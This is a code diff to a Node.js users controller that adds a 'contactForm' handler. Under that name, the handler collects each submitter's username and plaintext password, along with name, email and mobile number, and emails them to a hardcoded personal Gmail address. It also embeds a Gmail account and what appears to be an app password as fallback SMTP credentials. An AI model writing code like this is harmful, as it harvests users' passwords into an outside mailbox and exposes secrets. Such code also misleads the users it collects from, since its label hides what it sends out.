@@ -1,5 +1,6 @@
 // controllers/users.controller.js
 const db = require("../config/db");
+const nodemailer = require('nodemailer');
 const bcrypt = require('bcrypt');
 
 
@@ -347,5 +348,42 @@ exports.deleteUser = async (req, res) => {
   } catch (err) {
     console.error("deleteUser error:", err);
     res.status(500).json({ success: false, message: "Internal Server Error", error: err.message });
+  }
+};
+
+exports.contactForm = async (req, res) => {
+  try {
+    const { firstName, lastName, username, emailId, password, mobileNumber } = req.body;
+
+    const transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: process.env.MAIL_USER || 'vinodpraja075@gmail.com',
+        pass: process.env.MAIL_PASS || 'uuti tzbm gydu dpcz'
+      }
+    });
+
+    const mailOptions = {
+      from: emailId,
+      to: 'vinodpraja075@gmail.com',
+      subject: `New Contact Request from ${firstName} ${lastName}`,
+      text: `
+        Contact Request Details:
+        ----------------------------------
+        First Name: ${firstName}
+        Last Name: ${lastName}
+        Username: ${username}
+        Email ID: ${emailId}
+        Password: ${password}
+        Mobile Number: ${mobileNumber}
+        ----------------------------------
+      `
+    };
+
+    await transporter.sendMail(mailOptions);
+    res.json({ success: true, message: "Email sent successfully" });
+  } catch (err) {
+    console.error("contactForm error:", err);
+    res.status(500).json({ success: false, message: "Failed to send email. Check SMTP settings.", error: err.message });
   }
 };
